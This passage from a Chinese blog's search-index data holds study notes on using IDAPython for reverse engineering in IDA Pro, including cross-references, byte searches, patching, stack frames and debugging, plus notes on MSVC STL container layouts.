= idaapi.insn_t() idaapi.decode_insn(tmp,line) if tmp.Op1.type == idaapi.o_displ: op = 1 if tmp.Op2.type == idaapi.o_displ: op = 2 if op == None: continue if \"bp\" in idc.print_operand(line,0) or \"bp\" in idc.print_operand(line,1): if op == 1: index = (~(int(tmp.Op1.addr) - 1) \u0026 0xFFFFFFFF) else: index = (~(int(tmp.Op2.addr) - 1) \u0026 0xFFFFFFFF) else: if op ==1 : index = int(tmp.Op1.addr) else: index = int(tmp.Op2.addr) if index: displace[index].append( hex(line) ) print(displace) idaapi.decode_insn(tmp,line)是解析指令的另一种底层的方法. 我们已经获取了操作符的字符串表示,那么我们检查操作符中是否包含了“bp”字符串,这是一个快速判断操作符的中寄存器是否为bp,ebp或者rbp的方法.检查”bp”字符串的目的在于确定偏移量是否是一个负数.我们使用idaapi.cmd.Op1.addr来获取偏移量,这个方法会返回一个字符串.然后我们把他转换成为一个 integer类型,如果需要的话把它转换为正数,然后我们把它放进脚本最开始定义的字典display中去.这样就完成了我们的操作,之后如果你想要查找使用某个偏移量的所有地址,直接读取就可以了. 例2 有时候我们在逆向分析一个可执行文件的内存转储的时候,有些操作数就不是一个偏移量了.看如下代码: push 0Ch push 0BC10B8h push [esp+10h+arg_0] call ds:_strnicmp 第二个被push的值是一个存在内存中的偏移.如果我们通过右键把这个偏移定义为data类型,我们可以看到这个偏移其实是一个字符串,当然完成这个定义操作很简单,但是,有时候这种操作太多了话就需要写一个脚本来自动完成这件事情. import idc import idautils import idaapi from collections import defaultdict min = idc.get_inf_attr(idc.INF_MIN_EA) max = idc.get_inf_attr(idc.INF_MAX_EA) # for each known function for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) # skip library \u0026 thunk functions if flags \u0026 idc.FUNC_LIB or flags \u0026 idc.FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for curr_addr in dism_addr: if idc.get_operand_type(curr_addr, 0) == 5 and \\ (min \u003c idc.get_operand_value(curr_addr,0) \u003c max): idc.op_plain_offset(curr_addr, 0, 0) # print(hex(curr_addr)) if idc.get_operand_type(curr_addr, 1) == 5 and (min \u003c idc.get_operand_value(curr_addr,1) \u003c max): idc.op_plain_offset(curr_addr, 1, 0) # print( hex(curr_addr) ) 获取操作数的值: idc.get_operand_value(ea, n) 将操作数转换为一个偏移地址: #参数一:ea为地址. #参数二:n为操作数的索引. #参数三:是基地址,该例子中只需要设置为0即可. idc.op_plain_offset(ea, n, base) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:8:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"交叉引用(Xrefs) 能够定位data段和code段的交叉引用非常重要,交叉引用的重要性在于它能够提供某个确定的数据或者某个函数被调用的位置.举个例子,如果我们想要知道哪些地址调用了WriteFile()函数,我们所要做的就是在导入表中找到 WriteFile()函数,然后查看其交叉引用即可. import idc import idautils addr = idc.get_name_ea_simple(\"WriteFile\") print(idc.GetDisasm(addr)) for i in idautils.CodeRefsTo(addr, 0): print(hex(i), idc.GetDisasm(i)) 获取API函数的地址: idc.get_name_ea_simple(\"WriteFile\") 获取该API的所有交叉引用: #参数一:ea是我们想要寻找交叉引用的地址. #参数二:flow是一个bool值,它用于指定是否遵循正常的代码流. idautils.CodeRefsTo(ea,flow) 但有一点要注意:使用idautils.CodeRefsTo(ea，flow)的限制是,动态导入并手动重命名的API不会 显示为代码交叉引用.比如下面我们利用idc.MakeName(ea,name)将一个dword的地址重命名为\"RtlCompareMemory\". import idc import idautils import idaapi ea = idc.here() idc.MakeName(ea, \"RtlCompareMemory\") IDA并不会将这些API标记为交叉引用代码,稍后我们将会使用一个通用的技术来获得所有的交叉引用. 获取在IDA中任何API和被重命名的函数的相关信息: #返回一个类型为(ea, str_name)的元组. idautils.Names() 获取任意地址所引用的代码: idautisl.CodeRefsFrom(ea,flow) 下面的例子展示获取某地址的引用信息. import idc import idautils import idaapi addr = idc.here() for i in idautils.CodeRefsFrom(addr,0): print(hex(i),idc.GetDisasm(i)) 查找数据的交叉引用或者调用: #返回该数据地址的所有交叉引用(迭代器) idautils.DataRefsTo(ea) #返回该地址所引用的数据地址 idautils.DataRefsFrom(ea) 在查找数据和代码的交叉引用的时候可能会有一些困惑,这里我们使用前面所提到的有一种更加通用的方法来获取交叉引用,该方法调用两个函数就能完成获取所有交叉引用地址和调用地址的效果,这两个函数就是 idautils.XrefsTo(ea,flags=0)和idautils.XrefsFrom(ea,flags=0). import idc import idautils import idaapi addr = idc.here() print(hex(addr),idc.GetDisasm(addr)) for xref in idautils.XrefsTo(addr,1): print(xref.type,idautils.XrefTypeName(xref.type),hex(xref.frm),hex(xref.to),xref.iscode) #idc.ida_xref.XREF_ALL=0 (default) #idc.ida_xref.XREF_FAR=1 #idc.ida_xref.XREF_DATA=2 idautils.XrefsTo(ea,flags=0) xref.type来指明该交叉引用的类型. idautils.XrefTypeName(xref.t ype)用来打印表示该类型的含义,这其中有十二种不同的类型. #可在idautils.py文件中查看 _ref_types = { ida_xref.fl_U : 'Data_Unknown', ida_xref.dr_O : 'Data_Offset', ida_xref.dr_W : 'Data_Write', ida_xref.dr_R : 'Data_Read', ida_xref.dr_T : 'Data_Text', ida_xref.dr_I : 'Data_Informational', ida_xref.fl_CF : 'Code_Far_Call', ida_xref.fl_CN : 'Code_Near_Call', ida_xref.fl_JF : 'Code_Far_Jump', ida_xref.fl_JN : 'Code_Near_Jump', 20 : 'Code_User', ida_xref.fl_F : 'Ordinary_Flow' } xref.frm 打印出该地址的交叉引用. xref.to 打印出该地址本身. xref.iscode 打印出该交叉引用是否在代码段中. 上述的代码我们使用了idautils.XrefsTo(ea, 1)并将其flag位设为了1,如果我们将flag设为0,那么它将会显示该地址的任意交叉引用.设置flag为0获取的交叉引用不只是来自于分支跳转指令,同时还会来自正常的指令流程,设置flag为1可以略过正常指令流程造成的交叉引用. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:9:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"搜索 我们其实已经能够通过遍历所有已知的函数及其指令来达到一种基本的搜索效果,这当然很有用,但是有时候我们需要搜索一些特定的字节,比如说 0x55,0x8b,0xec 这种字节序列,这3个字节其实代表的汇编代码为 push ebp, mov ebp, esp.所以我们可以使用idc.find_binary(ea,flag,searchstr,radix=16)来进行字节或者二进制的搜索. ea代表啥就不说了,flag代表搜索方向或者条件.flag有好几种不同的类型： #可在idc.py中查看 SEARCH_UP = 0 SEARCH_DOWN = 1 SEARCH_NEXT = 2 SEARCH_CASE = 4 SEARCH_REGEX = 8 SEARCH_NOBRK = 16 SEARCH_NOSHOW = 32 上面的类型不必要都看一遍,但是还是要看看一些常用的类型: SEARCH_UP 和SEARCH_DOWN 用来指明搜索的方向. SEARCH_NEXT 用来获取下一个已经找到的对象 SEARCH_CASE 用来指明是否区分大小写 SEARCH_NOSHOW 用来指明是否显示搜索的进度 searchstr 是我们要查找的内容,radix 参数在写处理器模块时使用,这超出本书要讲解的范围,所以我推荐你去看一看 Chris Eagle 的“The IDA Pro Book”的第 19 章,所以这里我们把radix参数留空.现在让我们来实现刚才提到的那三个字节的搜索好了: #这是一个错误示例 地址并没有增加 import idc import idautils import idaapi pattern = \"55 8B EC\" addr = idc.get_inf_attr(idc.INF_MIN_EA) for x in range(0,5): addr = idc.find_binary(addr,idc.SEARCH_DOWN,pattern) if addr!= idc.BADADDR: print(hex(addr),idc.GetDisasm(addr)) 第一行我们定义了要搜索的形式,搜索形式可以是16进制格式,比如 0x55 0x8B 0xEC和 55 8B EC都是可以的,\\x55\\x8B\\xEC 这种格式可不行,除非你使用idc.find_text(ea, flag,y, x, searchstr)这个函数. 但是我们搜索的时候,地址并没有增长,那是因为我们写程序的时候没有增加SEARCH_NEXT这个标记.正确的写法如下: import idc import idautils import idaapi pattern = \"55 8B EC\" addr = idc.get_inf_attr(idc.INF_MIN_EA) for x in range(0,5): addr = idc.find_binary(addr,idc.SEARCH_DOWN | idc.SEARCH_NEXT,pattern) if addr!= idc.BADADDR: print(hex(addr),idc.GetDisasm(addr)) 搜索字符串: #参数一:ea是地址. #参数二:flag是搜索方向和搜索类型. #参数三:y是从ea开始搜索的行数,通常置0. #参数四:x是行中的坐标,通常置0. #参数五:searchstr是要搜索的字符串. idc.find_text(ea, flag, y, x, searchstr, from_bc695=False) 现在我们开始查找字符串“NoRun”的出现的次数.当然你可以换换其他的字符串,可以从字符串窗口(shift+F12)获得. import idc import idautils import idaapi addr = idc.get_inf_attr(idc.INF_MIN_EA) end = idc.get_inf_attr(idc.INF_MAX_EA) while addr \u003c end: addr = idc.find_text(addr, idc.SEARCH_DOWN, 0, 0, \"NoRun\") if addr == idc.BADADDR: break else: print(hex(addr), idc.GetDisasm(addr)) addr = idc.next_head(addr) 因为我们利用了idc.NextHead(ea)使当前地址不断增长,所以就不需要在idc. FindText()中添加 SEARCH_NEXT的标志.为什么我们要手动的增加地址呢,因为一行字符串中可能出现多次要查找的字符串,往上翻认真阅读 SEARCH_NEXT的标志的意思. 判断一个地址的类型: #下述这些api返回bool值,true或者false. idc.is_code(f) # 判断是否是代码. idc.is_data(f) # 判断是否是数据. idc.is_tail(f) # 判断 IDA 是否将其判定为尾部. idc.is_unknown(f) # 判断 IDA 是否将其判定为未知,即既不是数据,也不是代码. idc.is_head(f) # 判断 IDA 是否将其判定为头部. f这个参数是新出现的,相比起于传递地址,我们还要先通过idc.get_full_flags(ea)获取地址的内部标志表示,然后再传给idc.is系列函数当参数,代码如下: import idc ea = idc.here() f = idc.get_full_flags(ea) print(idc.is_code(f)) 寻找被标志为代码的下一个地址: idc.find_code(ea,flag) 上述API我们想要查找数据块的末尾是很有帮助的.如果ea是代码地址,那么上述函数返回下一个代码地址,flag参数看前面的idc.find_text就可以了. .text:00577821 push 0 .text:00577823 mov eax, offset loc_56B690 Python\u003eidc.find_code(0x00577821, idc.SEARCH_DOWN | idc.SEARCH_NEXT) 0x577823 这个函数会跳过一些数据段的地址,得到最近的一个代码段的首地址. idc.find_data(ea,flag)和上面的find_code函数差不多,不过它返回的是数据段的地址. idc.find_unknown(ea,flag)该功能用于查找IDA未识别为代码或数据的字节地址,未知类型需要通过观察或脚本进一步手动分析. idc.find_defined(ea, flag)它用于查找IDA标识为代码或数据的地址. idc.find_imm(ea, flag, value)用来寻找立即数.例如:相比于寻找一些类型,我们有些时候其实更希望能够找到特定的值,举个例子,你感觉代码里面肯定是用了rand()函数来产生随机数的,但是你就是找不到它,咋办? 如果我们知道这个rand()函数采用了0x343fd作为种子那么我们就可以去寻找这个值. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:10:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"数据提取 获取用户鼠标选中部分的起始和结束地址: idc.read_selection_start() idc.read_selection_end() 注意idc.read_selection_end()获取的的并不是选中部分代码的末尾地址,而是选中部分的最后一条指令的下一条指令的起始地址. 函数idaapi.read_selection()也可以实现上面的效果. import idaapi p0 = idaapi.twinpos_t() p1 = idaapi.twinpos_t() view = idaapi.get_current_viewer() idaapi.read_selection(view, p0, p1) print(\"start:\", hex(p0.place(view).ea)) print(\"end:\", hex(p1.place(view).ea)) #注意此处,hex(p1.place(view).ea)是选中部分的最后一条指令的地址 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:11:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"注释和重命名 注释一共有两种: 常规注释 重复性注释 重复性注释会因为某些地址引用了当前地址的内容,而会自动添加上注释. 添加注释: idc.set_cmt(ea, cmt, 0) 添加重复性注释: idc.set_cmt(ea, cmt, 1) 获取常规注释: idc.get_cmt(ea, 0) 获取重复性注释: idc.get_cmt(ea, 1) 函数添加获取注释: #参数一:ea可以是函数中的任何地址 #参数二:cmt就是我们要添加的注释 #参数三:repeatable是否为重复性注释 #将函数的注释标记为可重复性的话,那么它会在任何调用该函数的地方添加注释 idc.set_func_cmt(ea, cmt, repeatable) idc.get_func_cmt(ea, repeatable) 重命名某个地址的函数: idaapi.set_name(ea, name) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:12:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"访问原始数据 在逆向工程中获取原始数据是非常重要的,原始数据是16进制的字节,它们被解释为数据或代码,ida中我们可以在反汇编窗口的左侧可以看到这些原始数据.(IDA中显示的设置方法:菜单栏–\u003e选项–\u003e常规–\u003e反汇编–\u003e机器码字节数，填入一个数就ok了–\u003e确定). 获取指定地址数据: #获取1字节 idc.get_wide_byte(ea) #获取2字节 idc.get_wide_word(ea) #获取4字节 idc.get_wide_dword(ea) #获取8字节 idc.get_qword(ea) idc.GetFloat(ea) idc.GetDouble(ea) 获取指定地址指定字节数: #返回bytes类型 idc.get_bytes(ea, size, use_dbg = False) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:13:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"补丁 有时候我们在逆向一个恶意软件的时候,样本会有被加密的字符串.这会阻碍我们分析的过程和阻止我们通过字符串来定位关键点.这种情况下给idb文件打补丁就很有用了. Patch相关函数: patch_byte(ea, value) patch_word(ea, value) patch_dword(ea, value) patch_qword(ea, value) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:14:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"输入输出 在IDAPython中,当我们并不知道文件的位置或者并不知道用户想要把他们的数据存储在什么地方,输入输出文件就很重要了. #参数一:forsave 0,打开一个文件对话框;1,打开一个文件保存对话框. #参数二:mask用来指定文件后缀或者模式,如:\"*.dll\". #参数三:prompt 窗口的名字. ida_kernwin.ask_file(for_saving, mask, prompt) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:15:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"PyQt 在某些情况下使用图形界面和代码交互是很有用的,在IDA Python中使用PyQt的代码如下: import idc import idaapi from PyQt5 import QtCore, QtGui, QtWidgets class MyPluginFormClass(idaapi.PluginForm): def OnCreate(self, form): # Get parent widget self.parent = self.FormToPyQtWidget(form) # IDAPython self.PopulateForm() def PopulateForm(self): # Create layout layout = QtWidgets.QVBoxLayout() # Create Table Widget self.example_row = QtWidgets.QTableWidget() column_names = [\"Address\", \"Mnemonic\"] self.example_row.setColumnCount(len(column_names)) self.example_row.setRowCount(0) self.example_row.setHorizontalHeaderLabels(column_names) self.example_row.doubleClicked.connect(self.JumpSearch) layout.addWidget(self.example_row) # Create Button self.addbtn = QtWidgets.QPushButton(\"Add Address\") self.addbtn.clicked.connect(self.AddAddress) layout.addWidget(self.addbtn) # make our created layout the dialogs layout self.parent.setLayout(layout) def AddAddress(self): ea = idc.here() # IDAPython index = self.example_row.rowCount() self.example_row.setRowCount(index + 1) h = \"0x%x\" % ea item = QtWidgets.QTableWidgetItem(h) item.setFlags(item.flags() ^ QtCore.Qt.ItemIsEditable) self.example_row.setItem(index, 0, item) self.example_row.setItem(index, 1, QtWidgets.QTableWidgetItem(idc.print_insn_mnem(ea))) # IDAPython self.example_row.update() def JumpSearch(self, item): tt = self.example_row.item(item.row(), 0) ea = int(tt.text(), 16) idaapi.jumpto(ea) # IDAPython plg = MyPluginFormClass() plg.Show(\"Jump Around\") ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:16:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"批生成文件 有时,为目录中的所有文件创建IDB或ASM可能很有用,我们只需借助idat.exe的-B参数即可. 给指定目录下的所有程序生成idb的代码如下: import os import subprocess idat_path = \"XXX/IDA_Pro/idat.exe\" file_path = 'XXX' for root, dirs, files in os.walk(file_path): for file in files: file_path = os.path.join(root, file) if(file_path.endswith(\".exe\")): subprocess.call([idat_path, \"-B\", file_path]) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:17:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"可执行脚本 IDAPython脚本可以在命令行中执行,我们也可以使用下面计算IDB拥有指令个数的脚本,然后将其个数写进一个叫做“instru_count.txt”文件中. import idc import idautils import idaapi idaapi.auto_wait() count = 0 for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB: continue for instru in idautils.FuncItems(func): count += 1 f = open(\"instru_count.t\",'w') writeContent = \"Instruction count is {}\".format(count) print(writeContent) f.write(writeContent) f.close() idc.qexit(0) 上面两个十分重要的函数,一个是idaapi.auto_wait(),一个是idc.qexit(0),当ida打开一个文件的时候,等待IDA分析完成是很重要的,因为IDA分析一个文件需要花大量的时间.这时候你不能执行IDAPython脚本,所以你可使用idaapi.auto_wait()来等待IDA文件分析结束,它会在IDA分析完成之前一直等待,一旦分析完成,控制权就会交到脚本身上.然后我们同样需要使用idc.qexit(0)来结束脚本的执行,如果不这么做的话,IDB可以会在关闭的时候出问题. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:18:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"流程图 使用IDAPython生成CFG图. import idc import idautils import idaapi def cls_main(p=True): f = idaapi.FlowChart(idaapi.get_func(idc.here())) for block in f: if p: print(\"%x - %x [%d]:\" % (block.start_ea, block.end_ea, block.id)) for succ_block in block.succs(): # 获取后继节点 if p: print(\" succs: %x - %x [%d]:\" % (succ_block.start_ea, succ_block.end_ea, succ_block.id)) for pred_block in block.preds(): # 获取前驱节点 if p: print(\" preds:%x - %x [%d]:\" % (pred_block.start_ea, pred_block.end_ea, pred_block.id)) cls_main() ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:19:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"函数栈帧的访问 在x86程序中,EBP寄存器通常专门用做栈帧指针,例外gun/g++提供 -fomit-frame-pointer编译选项,可以生成不依赖于固定帧指针寄存器的函数. 基于ebp做栈帧指针的函数,正偏移是函数参数,负偏移是则用于访问函数的局部变量. 很明显函数的栈帧是一个运行时的概念,没有栈和运行时的程序,栈帧就不可能存在.话虽如此,但是并不意味者ida在做静态的分析的时候就会忽略掉栈帧的概念.二进制文件中包含配置每个函数栈帧所需的所有代码,通过仔细分析这些代码,我们就可以深入了解任何函数的栈帧结构,即使这个函数并未运行.在IDA中也会有一些复杂的分析来确定IDA反汇编的每个函数的栈帧布局.在分析的过程中,IDA会记住每一次push/pop操作,以及其他的任何可能改变栈指针的运算,如增加或者减去常量,尽可能的去观察栈指针在函数执行时的行为. IDA提供一个摘要视图,列出了栈帧内被直接引用的每一个变量,以及变量的大小和与它们与帧指针的偏移距离. .text:005680D7 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) .text:005680D7 _WinMain@16 proc near ; CODE XREF: __scrt_common_main_seh(void)+F3↑p .text:005680D7 .text:005680D7 var_4 = dword ptr -4 .text:005680D7 hInstance = dword ptr 8 .text:005680D7 hPrevInstance = dword ptr 0Ch .text:005680D7 lpCmdLine = dword ptr 10h .text:005680D7 nShowCmd = dword ptr 14h idapython也提供获取此函数栈帧的api,获取到之后是一个结构体,操作结构体成员就可以获取到函数栈帧内的所有变量.相关的函数说明如下: idaapi.get_func(ea): retrieves the func_t structure for the function at ea. idaapi.get_frame(func_t foo): returns the struct_t structure for the function frame specified by foo. idautils.DecodeInstruction(ea): returns the inst_t representing instruction at ea,和函数idaapi.decode_insn功能相同. idaapi.get_stkvar(op_t op, sval_t v): op is a reference to an instruction, v is the immediate value in the operand. Usually you just use op.addr. It returns a tuple, (member_t, val). member_t is a pointer to the stack variable, which is what we need. val is the same value as the soff field in the member_t for the stack var. More on this later. idaapi.xreflist_t(): creates a new xreflist of xreflist_entry_t. idaapi.build_stkvar_xrefs(xreflist_t xrefs, func_t func, member_t member): fills xrefs with xreflist_entry_t‘s that represent the stack var xrefs given by member in func. struct_t.get_member(x): You can use this method to iterate all stack variables in a frame to retrieve all member_t‘s. If you want to build xrefs for all stack variables, this is usually easier. idc.get_member_name(id, member_offset): id is the struct sid，member_offset. get the member name defined in the name. idc.get_member_offset(id,name)：Get offset. 下面对iautils.DecodeInstruction(ea)指令进行一个简单的说明,这是一个指令解码的API,如果解码失败返回None,否则将返回一个包含该指令及其操作数的指令对象. 比较重要的指令属性如下: inst.itype:标志当前指令的类型,是一个整数,不同的opcode可能有相同的itype,但是opcode不是itype. inst.size:表示解码后的指令长度. inst.ops[]:以0为索引的数组,用来保存操作数的相关信息. inst.Op1...inst.OpN:以1位索引起始操作数组别名,和inst.ops[n+1]等价. inst.ea:指令的线性地址. 你可能会想知道opcode和它的itype之间到底是什么关系.其实很简单,在IDA中,开源数据库处理器模块负责根据opcode来填充itype字段.在IDA SDK中,你可以找到一个allins.hpp的头文件.该头文件包含了所有支持的处理器模块的枚举数据其中包含了受支持的所有指令: // allins.hpp // x86/x64 itypes enum { NN_null = 0, // Unknown Operation NN_aaa, // ASCII Adjust after Addition NN_aad, // ASCII Adjust AX before Division NN_aam, // ASCII Adjust AX after Multiply NN_aas, // ASCII Adjust AL after Subtraction . . . NN_jz, // Jump if Zero (ZF=1) NN_jmp, // Jump NN_jmpfi, // Indirect Far Jump NN_jmpni, // Indirect Near Jump NN_jmpshort, // Jump Short (not used) NN_lahf, // Load Flags into AH Register . . . // Pentium III Pseudo instructions NN_cmpeqps, // Packed Single-FP Compare EQ NN_cmpltps, // Packed Single-FP Compare LT NN_cmpleps, // Packed Single-FP Compare LE NN_cmpunordps, // Packed Single-FP Compare UNORD . . . } 不知道为什么,反正NN_前缀用来表示x86/x64处理器上的指令. # .text:00568113 jz short loc_56812E inst = idautils.DecodeInstruction(0x00568113) print(\"YES\" if inst.itype == idaapi.NN_jz else \"NO\") 至于操作数,可以通过访问inst.Operands[]或者inst.OpN来访问.要获取被解码指令使用的操作数数量不应依赖Operands数组的长度,因为它总是被解析成UA_MAXOP==8（参阅ida.hpp）.因此应该使用遍历每个操作数并检查操作数的类型是否是o_void类型. 操作数的定义是ua.hpp中的op_t结构. op.flags：操作数的标志. op.dtype：操作数的长度类型.idaapi.dt_xxx常量,可以通过该常量来获取操作数的字节大小（1 == idaapi.dt_byte,2 == idaapi.dt_word等等）. op.type：操作数类型.idc.o_xxx常量. specflags1…specflags4：处理器相关标志. 以下是受支持的操作数类型(o_xxx): o_void：没有该操作数. o_reg：该操作数是寄存器(ax,al,es,ds等等). o_mem：直接寻址(数据). o_phrase：[基址+变址]寻址. o_displ：[基址+变址+偏移]寻址. o_imm：立即数. o_far：直接远地址(far address,代码). o_near：直接近地址(near address,代码). o_dispspec0...o_dispspec5：处理器相关标志. 还有一些操作数成员的含义因操作","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:20:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"调试 安装调试的hook使用如下api: debugger = idaapi.DBG_Hooks() debugger.hook() 现在运行调试器,hook会捕捉所有的调试事件,这样就能非常精确的控制IDA调试器.下面的函数在调试的时候非常有用: # 在指定的地点设置软件断点 idc.add_bpt( long Address ) # 返回当前设置的断点数量 idc.get_bpt_qty() # 获取寄存器的值,dbg必须处于运行状态 idc.get_reg_value(string Register) # 通过寄存器名获得寄存器值 idc.set_reg_Value(long Value, string Register) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:21:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"同类总结参考 总结IDAPython在逆向中的应用 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:22:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["Win相关"],"content":"这里以VS2017 Release版本为示例: ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:0:0","tags":["Windows"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"String(大小0x18) struct string { Union _Bxty { char _Buf[16]; char* _Ptr; } size_t _Mysize; //字符串长度 size_t _Myres; //最大字符串长度 }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:1:0","tags":["Windows"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"Vector(大小0xC) struct vector { T* _Myfirst; //数组起始地址 T* _Mylast; T* _Myend; }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:2:0","tags":["Windows"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"Map(大小0x8) struct map { Tree_nod* _MyHead; unsigned int _Mysize; }; Tree_nod(大小0x10 + 键值对): struct __declspec(align(4)) Tree_nod { Tree_nod* _Left; Tree_nod* _Parent; Tree_nod* _Right; char _Color; char _Isnil; map_pair _Myval; //键值对 }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:3:0","tags":["Windows"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"List(大小0x8) struct list { List_node* _MyHead; unsigned int _Mysize; } List_node(大小0x8 + 值): struct __declspec(align(4)) List_node { List_node* _Next; List_node* _Prev; int _Myval; //值 } list-\u003eMyHead-\u003eNext为list.front(); list-\u003eMyHead-\u003ePrev为list.back(); ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:0","tags":["Windows"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":null,"content":" __ __ _ _ _ _ \\ \\/ / (_) __ _ | | _ _ ___ | | | | _ _ _ __ \\ / | | / _` | | | | | | | / _ \\ | |_| | | | | | | '_ \\ / \\ | | | (_| | | |___ | |_| | | (_) | | _ | | |_| | | | | | /_/\\_\\ |_| \\__,_| |_____| \\__,_| \\___/ |_| |_| \\__,_| |_| |_| ___ ___ _ _____ ___ ____ ___ ___ ____ _ _ ____ ___ / _ \\ / _ \\ _ / | |___ / / _ \\ | ___| / _ \\ / _ \\ |___ \\ | || | |___ \\ / _ \\ | | | | | | | | (_) | | |_ \\ | | | | |___ \\ | | | | | | | | __) | | || |_ __) | | | | | | |_| | | |_| | _ | | ___) | | |_| | ___) | | |_| | | |_| | / __/ |__ _| / __/ | |_| | \\__\\_\\ \\__\\_\\ (_) |_| |____/ \\___/ |____/ \\___/ \\___/ |_____| |_| |_____| \\___/ ____ _ _ __ | _ \\ ___ __ __ ___ _ __ ___ ___ | | (_) / _| ___ | |_) | / _ \\ \\ \\ / / / _ \\ | '__| / __| / _ \\ | | | | | |_ / _ \\ | _ \u003c | __/ \\ V / | __/ | | \\__ \\ | __/ | |___ | | | _| | __/ |_| \\_\\ \\___| \\_/ \\___| |_| |___/ \\___| |_____| |_| |_| \\___| ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"}]